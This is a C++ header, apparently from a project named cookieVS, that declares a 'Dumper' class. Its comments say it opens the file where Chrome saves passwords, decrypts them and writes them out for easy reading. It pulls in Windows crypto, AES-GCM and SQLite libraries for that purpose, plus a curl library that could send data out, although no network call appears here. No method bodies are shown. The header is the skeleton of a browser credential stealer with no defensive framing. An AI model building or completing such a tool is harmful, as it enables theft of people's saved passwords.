// cookieVS.h : Include file for standard system include files,
// or project specific include files.

#pragma once

#include <iostream>
#include <windows.h>
#include <string>
#include <wincrypt.h>
#include <winsqlite/winsqlite3.h>
#include <nlohmann/json.hpp>
#include <fstream>
#include "base64.h"
#include <cryptopp/aes.h>
#include <cryptopp/modes.h>
#include <cryptopp/gcm.h>
#include<cryptopp/filters.h>
#include <assert.h> 
#include <curlpp/cURLpp.hpp>
#include <curlpp/Options.hpp>
#pragma comment(lib, "Crypt32")
// TODO: Reference additional headers your program requires here.
using namespace std;


//Open the file where Chrom saves the passwords
//Decrypt the password, them write them to a db file for easy reading later
class Dumper
{
private:
	static const string chromePath;
	static string masterKey;

	static string decryptPassword(BYTE* txt);
	static int handlePasswords(void* notUsed, int argc, char** argv, char** azColName);
	static string readPasswords();
	static void getMasterKey();

public:
	static void dumpPassword();

};

